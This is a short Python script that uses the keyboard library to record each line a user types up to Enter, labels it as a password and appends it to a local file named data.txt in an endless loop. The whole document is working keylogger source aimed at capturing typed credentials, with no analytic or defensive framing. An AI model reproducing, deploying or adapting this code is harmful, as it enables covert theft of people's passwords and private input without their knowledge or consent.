import keyboard

path = "data.txt"

while True:
    with open(path, 'a') as dataFile:

        typed = keyboard.record('enter')
        password = list(keyboard.get_typed_strings(typed))

        dataFile.write('\n')
        dataFile.write(password[0])
        